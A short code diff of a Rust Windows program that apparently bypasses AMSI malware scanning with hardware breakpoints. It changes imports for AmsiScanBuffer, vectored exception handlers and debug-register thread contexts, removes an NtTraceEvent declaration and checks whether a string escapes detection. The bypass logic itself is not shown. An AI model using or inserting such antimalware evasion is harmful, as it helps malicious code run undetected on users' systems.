@@ -1,40 +1,21 @@
-use std::{
-    ffi::OsStr,
-    mem::zeroed,
-    ops::Add,
-    os::raw::c_void,
-    ptr::{null, null_mut},
-};
+use std::{mem::zeroed, os::raw::c_void, ptr::null_mut};
 
-use windows_sys::{
-    Win32::{
-        Foundation::{EXCEPTION_SINGLE_STEP, S_OK},
-        System::{
-            Antimalware::{
-                AMSI_RESULT, AMSI_RESULT_CLEAN, AMSI_RESULT_DETECTED, AmsiCloseSession,
-                AmsiInitialize, AmsiOpenSession, AmsiScanBuffer, AmsiScanString, AmsiUninitialize,
-                HAMSICONTEXT, HAMSISESSION,
-            },
-            Diagnostics::Debug::{
-                AddVectoredExceptionHandler, CONTEXT, CONTEXT_DEBUG_REGISTERS_AMD64,
-                EXCEPTION_CONTINUE_EXECUTION, EXCEPTION_CONTINUE_SEARCH, EXCEPTION_POINTERS,
-                GetThreadContext, SetThreadContext,
-            },
-            LibraryLoader::{GetModuleHandleA, GetProcAddress, LoadLibraryA},
-            Threading::{GetCurrentThread, LPTHREAD_START_ROUTINE},
+use windows_sys::Win32::{
+    Foundation::{EXCEPTION_SINGLE_STEP, S_OK},
+    System::{
+        Antimalware::{
+            AMSI_RESULT, AMSI_RESULT_CLEAN, AMSI_RESULT_DETECTED, AmsiCloseSession, AmsiInitialize,
+            AmsiOpenSession, AmsiScanBuffer, AmsiUninitialize, HAMSICONTEXT, HAMSISESSION,
         },
+        Diagnostics::Debug::{
+            AddVectoredExceptionHandler, CONTEXT, CONTEXT_DEBUG_REGISTERS_AMD64,
+            EXCEPTION_CONTINUE_EXECUTION, EXCEPTION_CONTINUE_SEARCH, EXCEPTION_POINTERS,
+            GetThreadContext, SetThreadContext,
+        },
+        LibraryLoader::{GetProcAddress, LoadLibraryA},
+        Threading::GetCurrentThread,
     },
-    core::{HRESULT, PWSTR},
 };
-
-unsafe extern "system" {
-    fn NtTraceEvent(
-        TraceHandle: *mut c_void,
-        Flags: u32,
-        FieldSize: u32,
-        Fields: *mut c_void,
-    ) -> i32;
-}
 
 static mut AMSI_SCAN_BUFFER_ADDR: *mut c_void = null_mut();
 
@@ -184,7 +165,6 @@ fn check_amsi() -> bool {
             println!("[+] AMSI did NOT flag the string");
         }
 
-        // Clean up session and context
         AmsiCloseSession(ctx, session);
         AmsiUninitialize(ctx);
         detected
